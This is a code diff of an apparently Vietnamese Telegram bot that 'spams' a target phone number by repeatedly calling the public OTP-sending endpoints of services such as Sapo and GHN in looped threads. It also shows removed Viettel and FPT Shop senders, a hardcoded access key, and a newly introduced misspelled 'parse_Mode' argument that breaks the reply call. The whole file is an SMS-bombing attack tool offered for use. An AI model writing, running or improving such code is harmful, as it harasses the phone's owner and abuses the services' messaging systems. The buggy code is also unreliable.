@@ -13,42 +13,23 @@ CORRECT_KEY = "anhanh88"
 
 def send_otp_via_sapo(sdt):
     try:
-        cookies = {'landing_page': 'https://www.sapo.vn/', 'lang': 'vi'}
-        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-        data = {'phonenumber': sdt}
-        requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data, timeout=5)
-    except:
-        pass
-
-def send_otp_via_viettel(sdt):
-    try:
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-        json_data = {'phone': sdt, 'typeCode': 'DI_DONG', 'actionCode': 'myviettel://login_mobile', 'type': 'otp_login'}
-        requests.post('https://viettel.vn/api/getOTPLoginCommon', headers=headers, json=json_data, timeout=5)
-    except:
-        pass
+        data = {'phonenumber': sdt}
+        requests.post('https://www.sapo.vn/fnb/sendotp', headers=headers, data=data, timeout=5)
+    except Exception as e:
+        print(f"Sapo error: {e}")
 
 def send_otp_via_ghn(sdt):
     try:
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'content-type': 'application/json'}
+        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
         json_data = {'phone': sdt, 'type': 'register'}
         requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data, timeout=5)
-    except:
-        pass
-
-def send_otp_via_fptshop(sdt):
-    try:
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'content-type': 'application/json'}
-        json_data = {'fromSys': 'WEBKHICT', 'otpType': '0', 'phoneNumber': sdt}
-        requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data, timeout=5)
-    except:
-        pass
+    except Exception as e:
+        print(f"GHN error: {e}")
 
 sms_functions = [
     send_otp_via_sapo,
-    send_otp_via_viettel,
-    send_otp_via_ghn,
-    send_otp_via_fptshop
+    send_otp_via_ghn
 ]
 
 def run_spam(sdt, loops):
@@ -135,7 +116,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"🚀 Bắt đầu spam tới `{phone}`\n"
             f"🔄 Số lần lặp: *{loop_str}*...",
-            parse_mode="Markdown"
+            parse_Mode="Markdown"
         )
 
         threading.Thread(target=run_spam, args=(phone, loops)).start()
